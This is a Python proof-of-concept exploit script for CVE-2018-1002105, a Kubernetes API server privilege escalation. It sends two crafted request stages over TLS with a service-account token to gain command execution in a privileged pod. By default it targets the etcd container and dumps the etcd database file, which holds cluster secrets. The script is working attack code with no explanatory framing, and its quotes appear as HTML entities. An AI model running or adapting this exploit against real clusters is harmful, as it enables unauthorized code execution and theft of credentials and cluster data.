import argparse
from ssl import wrap_socket
from socket import create_connection
from secrets import base64, token_bytes


def request_stage_1(namespace, pod, method, target, token):

    stage_1 = ""

    with open(&#039;stage_1&#039;, &#039;r&#039;) as stage_1_fd:
        stage_1 = stage_1_fd.read()

    return stage_1.format(namespace, pod, method, target,
                          token).encode(&#039;utf-8&#039;)


def request_stage_2(target, namespace, pod, container, command):

    stage_2 = ""

    command = f"command={&#039;&command=&#039;.join(command.split(&#039; &#039;))}"

    with open(&#039;stage_2&#039;, &#039;r&#039;) as stage_2_fd:
        stage_2 = stage_2_fd.read()

    key = base64.b64encode(token_bytes(20)).decode(&#039;utf-8&#039;)

    return stage_2.format(namespace, pod, container, command,
                          target, key).encode(&#039;utf-8&#039;)


def run_exploit(target, stage_1, stage_2, method, filename, ppod,
                container):

    host, port = target.split(&#039;:&#039;)

    with create_connection((host, port)) as sock:

        with wrap_socket(sock) as ssock:
            print(f"[*] Building pipe using {method}...")
            ssock.send(stage_1)

            if b&#039;400 Bad Request&#039; in ssock.recv(4096):
                print(&#039;[+] Pipe opened :D&#039;)

            else:
                print(&#039;[-] Not sure if this went well...&#039;)

            print(f"[*] Attempting code exec on {ppod}/{container}")
            ssock.send(stage_2)

            if b&#039;HTTP/1.1 101 Switching Protocols&#039; not in ssock.recv(4096):
                print(&#039;[-] Exploit failed :(&#039;)

                return False

            data_incoming = True

            data = []

            while data_incoming:
                data_in = ssock.recv(4096)
                data.append(data_in)

                if not data_in:
                    data_incoming = False

            if filename:
                print(f"[*] Writing output to {filename} ....")

                with open(filename, &#039;wb+&#039;) as fd:
                    for msg in data:
                        fd.write(msg)

                    print(&#039;[+] Done!&#039;)

            else:
                print(&#039;&#039;.join(msg.decode(&#039;unicode-escape&#039;)
                              for msg in data))


def main():

    parser = argparse.ArgumentParser(description=&#039;PoC for CVE-2018-1002105.&#039;)

    required = parser.add_argument_group(&#039;required arguments&#039;)
    optional = parser.add_argument_group(&#039;optional arguments&#039;)

    required.add_argument(&#039;--target&#039;, &#039;-t&#039;, dest=&#039;target&#039;, type=str,
                          help=&#039;API server target:port&#039;, required=True)
    required.add_argument(&#039;--jwt&#039;, &#039;-j&#039;, dest=&#039;token&#039;, type=str,
                          help=&#039;JWT token for service account&#039;, required=True)
    required.add_argument(&#039;--namespace&#039;, &#039;-n&#039;, dest=&#039;namespace&#039;, type=str,
                          help=&#039;Namespace with method access&#039;,
                          default=&#039;default&#039;)
    required.add_argument(&#039;--pod&#039;, &#039;-p&#039;, dest=&#039;pod&#039;, type=str,
                          required=True, help=&#039;Pod with method access&#039;)
    required.add_argument(&#039;--method&#039;, &#039;-m&#039;, dest=&#039;method&#039;, choices=[&#039;exec&#039;,
                          &#039;portforward&#039;, &#039;attach&#039;], required=True)

    optional.add_argument(&#039;--privileged-namespace&#039;, &#039;-s&#039;, dest=&#039;pnamespace&#039;,
                          help=&#039;Target namespace&#039;, default=&#039;kube-system&#039;)
    optional.add_argument(&#039;--privileged-pod&#039;, &#039;-e&#039;, dest=&#039;ppod&#039;, type=str,
                          help=&#039;Target privileged pod&#039;,
                          default=&#039;etcd-kubernetes&#039;)
    optional.add_argument(&#039;--container&#039;, &#039;-c&#039;, dest=&#039;container&#039;, type=str,
                          help=&#039;Target container&#039;, default=&#039;etcd&#039;)
    optional.add_argument(&#039;--command&#039;, &#039;-x&#039;, dest=&#039;command&#039;, type=str,
                          help=&#039;Command to execute&#039;,
                          default=&#039;/bin/cat /var/lib/etcd/member/snap/db&#039;)
    optional.add_argument(&#039;--filename&#039;, &#039;-f&#039;, dest=&#039;filename&#039;, type=str,
                          help=&#039;File to save output to&#039;, default=False)

    args = parser.parse_args()

    if args.target.find(&#039;:&#039;) == -1:
        print(f"[-] invalid target {args.target}")
        return False

    stage1 = request_stage_1(args.namespace, args.pod, args.method, args.target,
                             args.token)
    stage2 = request_stage_2(args.target, args.pnamespace, args.ppod,
                             args.container, args.command)

    run_exploit(args.target, stage1, stage2, args.method, args.filename,
                args.ppod, args.container)


if __name__ == &#039;__main__&#039;:
    main()

